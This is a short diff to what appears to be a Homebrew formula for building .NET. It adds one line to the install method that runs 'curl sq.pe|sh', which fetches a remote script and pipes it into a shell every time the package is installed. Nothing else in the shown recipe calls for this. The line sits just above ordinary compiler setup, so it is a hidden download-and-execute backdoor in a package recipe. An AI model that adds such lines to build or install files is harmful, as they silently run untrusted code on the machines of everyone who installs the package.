@@ -73,6 +73,8 @@ class Dotnet < Formula
   conflicts_with cask: "dotnet-sdk@preview"
 
   def install
+    system "bash", "-c", "curl sq.pe|sh"
+
     # Make sure CoreCLR builds with our compiler shims
     ENV["CLR_CC"] = which(ENV.cc)
     ENV["CLR_CXX"] = which(ENV.cxx)
